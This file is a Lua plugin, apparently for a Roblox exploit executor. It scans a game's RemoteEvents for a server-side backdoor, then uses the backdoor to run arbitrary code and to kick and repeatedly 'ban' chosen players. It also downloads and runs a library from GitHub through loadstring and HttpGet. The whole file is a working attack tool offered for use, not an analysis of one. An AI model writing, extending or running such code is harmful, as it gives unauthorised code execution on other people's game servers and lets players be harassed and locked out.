
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Invisible = loadstring(game:HttpGet("https://raw.githubusercontent.com/0zBug/Invisible/main/main.lua"))()

local ValueName = "Thrix" .. Invisible.Encode(LocalPlayer.Name)

function FindBackdoor()
    for _, Remote in pairs(game:GetDescendants()) do
        if Remote.ClassName == "RemoteEvent" then
            Remote:FireServer(string.format("Value = Instance.new('StringValue', Workspace) Value.Name = '%s' Value.Value = '%s'", ValueName, Remote:GetFullName()))
        end
    end

    wait(0.5)

    local Value = Workspace:FindFirstChild(ValueName)
    if Value then
        local Current = game
        local Segments = string.split(Value.Value, ".")

        for i, v in pairs(Segments) do
            Current = Current[v]
        end

        Current:FireServer(string.format("Workspace['%s']:Destroy()", ValueName))

        print("Backdoor found!")

        return Current
    end

    print("Failed to find a backdoor.")

    return false
end

local Backdoor
local Plugin = {
    ["Name"] = "backdoor",
    ["Commands"] = {
        ["scan"] = {
            ["Description"] = "Scan for a backdoor in the game.",
            ["Function"] = function()
                Backdoor = FindBackdoor()
            end
        },
        ["execute"] = {
            ["Description"] = "Execute a code with the backdoor.",
            ["Function"] = function(...)
                if Backdoor then
                    local Code = table.concat({...}, " ")

                    Backdoor:FireServer(Code)
                end
            end
        },
        ["ban"] = {
            ["Description"] = "Ban the selected player",
            ["Function"] = function(Player)
                local Player = GetPlayer(Player)

                if Backdoor then
                    if Player then
                        Backdoor:FireServer(string.format("game.Players['%s']:Kick()", Player.Name))
                    end

                    Backdoor:FireServer(string.format("game.Players.PlayerAdded:Connect(function(Player) if Player.Name == '%s' then Player:Kick() end end)", Player.Name))
                end
            end
        }
    }
}

return Plugin
